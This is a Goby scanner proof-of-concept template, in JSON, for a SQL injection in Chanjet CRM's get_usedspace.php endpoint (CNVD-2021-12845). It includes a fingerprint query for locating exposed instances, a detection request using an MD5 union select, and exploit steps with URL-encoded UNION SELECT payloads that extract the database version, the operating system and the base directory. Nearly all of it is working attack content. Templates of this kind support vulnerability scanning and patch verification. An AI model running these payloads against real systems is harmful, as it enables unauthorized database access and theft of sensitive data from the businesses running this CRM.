{
      "Name": "Chanjet CRM get_usedspace.php sql injection CNVD-2021-12845",
      "Level": "3",
      "Tags": [
            "sqli"
      ],
      "GobyQuery": "title=\"畅捷CRM\"",
      "Description": "Chanjet Information Technology Co., Ltd. is a company dedicated to providing platform services, application services and data value-added services centered on financial and management services for small and micro enterprises in China.",
      "Product": "Chanjet CRM",
      "Homepage": "https://www.chanjet.com/",
      "Author": "",
      "Impact": "SQL injection exists in chanjet CRM get_usedspace.php and sensitive information can be obtained through vulnerability.",
      "Recommendation": "",
      "References": [
            "https://www.cnvd.org.cn/flaw/show/CNVD-2021-12845"
      ],
      "HasExp": true,
      "ExpParams": [
            {
                  "Name": "SQL",
                  "Type": "select",
                  "Value": "and%20%201%3d2%20union%20all%20select%20concat(0x5e5e21%2cconcat_ws(0x240924%2cifnull(%40%40version_compile_os%2c0x20))%2c0x215e5e) ,and%201%3d2%20union%20all%20select%20concat(0x5e5e21%2cconcat_ws(0x240924%2cifnull(version()%2c0x20))%2c0x215e5e),and%201%3d2%20union%20all%20select%20concat(0x5e5e21%2cconcat_ws(0x240924%2cifnull(%40%40basedir%2c0x20))%2c0x215e5e)"
            }
      ],
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{{r1}}}))",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": [
                              "r1|rand|int|8",
                              "md1|define|md5|r1"
                        ]
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "{{{md1}}}",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/webservice/get_usedspace.php?site_id=-1%20{{{SQL}}}",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "^^!",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "!^^",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|!(.*)!"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}